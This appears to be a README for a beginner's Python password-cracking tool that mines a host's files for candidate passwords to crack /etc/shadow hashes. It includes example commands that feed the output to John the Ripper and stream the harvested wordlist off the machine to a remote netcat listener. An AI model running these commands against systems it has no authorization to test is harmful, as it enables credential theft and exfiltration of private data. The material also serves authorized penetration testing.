# Dave Navarro's Goatee

              .                                                        
           b   A           Here's some ASCII art of a tribal dragon    
           $b  Vb.              that I found on the Internet to set    
           '$b  V$b.                 the tone of this terrible repo.   
            $$b  V$$b.                                                 
            '$$b. V$$$$oooooooo.         ..                            
             '$$P* V$$$$$""**$$$b.    .o$$P                            
              " .oooZ$$$$b..o$$$$$$$$$$$$C                             
              .$$$$$$$$$$$$$$$$$$$$$$$$$$$b.                           
              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                           
        .o$$$o$$$$$$$$P""*$$$$$$$$$P"""*$$$P                           
       .$$$**$$$$P"q$C    "$$$b        .$$P                            
       $$P   "$$$b  "$ . .$$$$$b.      *"                              
       $$      $$$.     "***$$$$$$$b. A.                               
       V$b   . Z$$b.  .       "*$$$$$b$$:                              
        V$$.  "*$$$b.  b.         "$$$$$                               
         "$$b     "*$.  *b.         "$$$b                              
           "$$b.     "L  "$$o.        "*"     .ooo..                   
             "*$$o.        "*$$o.          .o$$$$$$$$b.                
                 "*$$b.       "$$b.       .$$$$$*"   ""*.              
                    "*$$o.      "$$$o.    $$$$$'                       
                       "$$o       "$$$b.  "$$$$   ...oo..              
                         "$b.      "$$$$b. "$$$$$$$P*"""""             
                        . "$$       "$$$$b  "$$$$P"                    
                         L."$.      .$$$$$.  $$$$                      
          ..              $$$;      o$$$$$$  $$$$                      
       . $.l              "$$'    .$$$$$$$P  $$$P                      
     .I .$b b '.           "P   .P*""*$$$$;  $$$                       
   .$P  $$o ". ".  .        " ."      $$$$   $$;                       
  .$$;  $$$. "A "$. ".       '       o$$$P  .$P                        
 .$$$b  $$$$. *$. "$$$$o.          .$$$$P   $"                         
.$$$$$  $$$$$. "$$o."**$$$$o.'  .o$$$$P"    P                          
$$P"$$b $$$$$$o  "*$$$$boooooc$$$$$$$P"   .                            
$$  $$$."$$$"*$$.   "$$$$$$$$$$$$$$$$C  .o"                            
I"  $P"$."$$b. "*$.    "**$$$$$*"*$$$$$$$"                             
'   $  "$."$$$.   ""'              "*$$*                               
    $.   "."$$$$o        mls <---                                      
    "I       "$$$$b. .           \-------- Author of this supurb       
                "$$$b."$o.                   piece of artwork.         
                  "*$$."$$$o.                                          
                    "$$o $$$$b.                                        
                     '$$o'$$$$$b.                                      
                      '$$.'$$$**$o                                     
                       '$$.$$$. '$$                                    
                        $$; $$$o. "$.                                  
                        "$: $$ "*o  ".                                 
                     L   $$ $P    l  '.                                
                     $. .$$ $;                                         
                     ;$.$$P $                                          
                     "$$$$ P'                                          
                      $$$;:                                            
                      $$P                                              
                     o$P                                               
                     $P                                                
                     I'                                                
                     '                                                 


## Overview

This program attempts to crack hashes based on the contents of a
filesystem. It is currently pretty bad quality as I am just learning
Python.

In the future I plan on supporting more hash types besides ones
supported by crypt(), wordlist generation, and better efforts to
eliminate duplicate effort. This code actually works, but is slow. It
takes roughly 3 minutes to attempt to crack a single SHA-512 hash
against a 5kb text file. This should be used AFTER attempting to crack
hashes using John the Ripper or hashcat.

Some good paths to use this on are /home, /root, /var/www, /var/log,
/var/spool/{cron,mail,...), and /etc. In this program's current state,
it would likely take several weeks/months to work against
/. Additionally, you can collect specific files from a host, dump
router/switch configs, packet captures ran through strings, and place
them in a directory to run this tool against.

If someone makes the mistake of mentioning their passwords in a chat
program that gets logged to the hard drive, mis-types their password
into their shell, types their password into the username field of a
program that gets logged to /var/log, or adds their password somewhere
to a configuration file in plain text, this program will eventually
find it.

## How does this work?

It will recursively scan a directory for files that are not binaries
(contain no NULL characters), and read line by line, applying various
mutations to each line to generate a potential list of passwords. This
uses the entire line itself, a list of words reading character by
character from left to right, from right to left, every token
combination of every non-alphanumeric character, and each token broken
down left to right, then right to left.

To reduce CPU cost, you can specify minimum password lengths to try
and have the option to skip lines that do not score above a threshold
met by using Claude Shannon's entropy algorithm. I am currently
exploring ways to reduce duplicated combinations and to speed the
process up.

## Example usages:

### Crack /etc/shadow using contents of /home/daniel
```
./dave_navarros_goatee.py --path /home/daniel --hashfile /etc/shadow --minlength 8
```
This is the typical usage. Currently very slow, but works "quick enough"
against smaller directories.

### Generate wordlist from contents of /var/log
```
./dave_navarros_goatee.py --path /var/log --stdout >/tmp/wordlist.tmp
sort /tmp/wordlist.tmp |uniq >/tmp/wordlist.txt && rm /tmp/wordlist.tmp
```

wordlist.txt can now be transferred to a beefier rig and used with
John the Ripper, hashcat, or whatever suits your fancy. This has the
added benefit of supporting more hash types than crypt().

### Pipe output to John the Ripper
```
./dave_navarros_goatee.py --path /home --stdout | john --pipe --rules hashfile
```
This currently works great against smaller virtual machines and embedded
devices. Its kind of a bummer because either JtR doesn't support --fork with
--pipe, or I have failed to figure out how to do it properly.

This does not store a word list to the hard drive. It is also useful
for attempting to crack hashes not handled by crypt().

### Pipe over the network using netcat
```
# on receiving machine
nc -nlvp 443 >wordlist.txt


# on sending machine
./dave_navarros_goatee.py --path /home/daniel --stdout |nc ip.of.receiving.host 443
```

This is also great for smaller systems with limited resources
available or for transferring the wordlist to a beefier machine. Use
Ncat for SSL support.

